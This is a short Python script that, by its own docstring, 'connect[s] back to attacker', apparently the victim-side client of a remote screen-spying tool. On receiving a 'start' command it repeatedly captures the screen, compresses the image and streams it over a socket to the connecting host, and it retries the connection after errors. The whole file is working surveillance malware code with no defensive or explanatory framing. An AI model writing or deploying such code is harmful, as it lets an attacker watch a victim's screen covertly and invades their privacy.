import socket
from threading import Thread
from zlib import compress
import time

from mss import mss

WIDTH = 800
HEIGHT = 650

def retreive_screenshot(conn):
    with mss() as sct:
        # The region to capture
        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

        while True:
            # Capture the screen
            img = sct.grab(rect)
            # Tweak the compression level here (0-9)
            pixels = compress(img.rgb, 6)

            # Send the size of the pixels length
            size = len(pixels)
            size_len = (size.bit_length() + 7) // 8
            conn.send(bytes([size_len]))

            # Send the actual pixels length
            size_bytes = size.to_bytes(size_len, 'big')
            conn.send(size_bytes)

            # Send pixels
            conn.sendall(pixels)
def comm(sock,thread):
    command = sock.recv(1024)
    command = command.decode()
    if (command == "start"):
        print("Inside if command start recieved")
        thread.start()
        thread.join()
    elif command == "stop":
        comm(sock,thread)
def main(host='127.0.0.1', port=6969):
    ''' connect back to attacker on port'''
    buffer = 1024
    sock = socket.socket()
    sock.connect((host, port))
    try:
        while True:
            thread = Thread(target=retreive_screenshot, args=(sock,))
            comm(sock,thread)
    except Exception as e:
        print("ERR: ", e)
        sock.close()
    except:
        time.sleep(30.0)
        comm(sock,thread)

if __name__ == '__main__':
    try:
        main()
    except:
        time.sleep(30.0)
        main()